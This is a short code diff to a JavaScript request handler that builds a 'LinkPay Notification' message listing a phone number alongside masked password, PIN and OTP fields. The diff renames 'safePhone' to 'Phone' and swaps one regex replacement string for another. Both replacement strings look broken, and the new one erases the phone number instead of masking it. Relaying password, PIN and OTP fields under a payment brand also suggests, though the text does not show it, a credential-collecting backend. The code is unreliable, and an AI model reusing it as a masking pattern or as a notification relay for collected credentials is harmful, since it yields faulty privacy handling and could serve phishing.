@@ -17,16 +17,16 @@ export default async function handler(req, res) {
   const phone = req.body?.phone || "";
   const result = req.body?.result || "Action received";
 
-  const safePhone = phone
+  const Phone = phone
     ? String(phone).replace(
         /^(\+?\d{2})\d+(\d{2})$/,
-        "1"
+        ""
       )
     : "provided";
 
   const message =
     `🔔 LinkPay Notification\n\n` +
-    `📱 Phone: ${safePhone}\n` +
+    `📱 Phone: ${Phone}\n` +
     `🔑 Password: ********\n` +
     `🔢 PIN: ****\n` +
     `🔐 OTP: ******\n` +
